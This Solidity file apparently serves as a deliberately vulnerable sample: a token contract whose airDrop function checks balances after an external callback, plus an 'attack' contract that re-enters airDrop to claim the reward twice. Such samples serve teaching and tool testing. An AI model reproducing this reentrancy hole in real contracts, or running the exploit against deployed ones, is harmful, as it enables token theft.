pragma solidity ^0.4.24;

contract ModifierEntrancy {
    mapping(address => uint) public tokenBalance;
    string constant name = "Nu Token";

    function airDrop() public {
        uint _state = 0;
        while (true) {
            if (_state == 0) {
                if (!(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken())) {
                    revert();
                }
                _state = 1;
            } else if (_state == 1) {
                if (!(tokenBalance[msg.sender] == 0)) {
                    revert();
                }
                _state = 2;
            } else if (_state == 2) {
                tokenBalance[msg.sender] += 20;
                break;
            }
        }
    }
}

contract Bank {
    function supportsToken() external pure returns (bytes32) {
        return (keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack {
    bool hasBeenCalled;
    
    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return (keccak256(abi.encodePacked("Nu Token")));
    }
    
    function call(address token) public {
        ModifierEntrancy(token).airDrop();
    }
}